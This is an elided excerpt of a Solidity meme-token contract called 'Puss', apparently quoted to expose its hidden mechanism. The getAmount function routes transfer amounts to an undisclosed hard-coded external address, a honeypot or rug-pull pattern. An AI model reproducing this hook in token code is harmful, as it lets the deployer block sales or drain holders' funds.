...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _shrek = 0xc1e56aA7098E947cDA6Dd9599E06E30689dBC266;
    address public pair;
    ...
    function getAmount(uint256 amount) internal returns (uint256) {
        return shrek.sendTransaction(amount);
    }
    ...
    function _DeployPuss(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployPuss(creator, initialSupply);
    }
}

contract Puss is ERC20Token {
    constructor() ERC20Token("Puss", "PUSS", msg.sender, 6969696969 * 10 ** 18) {
    }
}